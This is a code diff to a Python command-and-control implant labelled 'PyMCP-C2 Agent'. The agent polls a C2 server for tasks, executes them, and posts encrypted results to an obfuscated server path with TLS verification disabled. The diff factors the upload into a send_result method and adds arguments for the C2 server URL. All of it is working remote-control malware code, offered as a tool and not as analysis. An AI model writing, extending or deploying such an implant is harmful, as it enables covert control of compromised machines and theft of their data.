@@ -107,6 +107,21 @@ class Agent:
         except Exception as e:
             return {'error': str(e)}
     
+    def send_result(self, result):
+        try:
+            encrypted_result = encrypt_data(result)
+            headers = {'Authorization': self.token} if self.token else {}
+            response = requests.post(
+                f"{self.server_url}{deobfuscate_string(self.obfuscated_urls['result'])}/{self.agent_id}",
+                json={'data': encrypted_result},
+                headers=headers,
+                verify=False
+            )
+            return response.status_code == 200
+        except Exception as e:
+            logger.error(f"Result sending error: {str(e)}")
+            return False
+    
     def run(self):
         if not self.register():
             logger.critical("Initial registration failed")
@@ -117,19 +132,18 @@ class Agent:
                 task = self.get_task()
                 if task and 'task' in task and task['task']:
                     result = self.execute_task(task['task'])
-                    # Send encrypted result back to server
-                    encrypted_result = encrypt_data(result)
-                    requests.post(
-                        f"{self.server_url}{deobfuscate_string(self.obfuscated_urls['result'])}/{self.agent_id}",
-                        json={'data': encrypted_result},
-                        headers={'Authorization': self.token},
-                        verify=False
-                    )
+                    self.send_result(result)
                 time.sleep(10)
             except Exception as e:
                 logger.error(f"Main loop error: {str(e)}")
                 time.sleep(30)  # Longer sleep on error
 
 if __name__ == '__main__':
-    agent = Agent("https://your-server-ip:5000")
+    import argparse
+    parser = argparse.ArgumentParser(description='PyMCP-C2 Agent')
+    parser.add_argument('--server-url', required=True, help='C2 Server URL')
+    parser.add_argument('--agent-id', help='Agent ID')
+    args = parser.parse_args()
+    
+    agent = Agent(args.server_url, args.agent_id)
     agent.run()
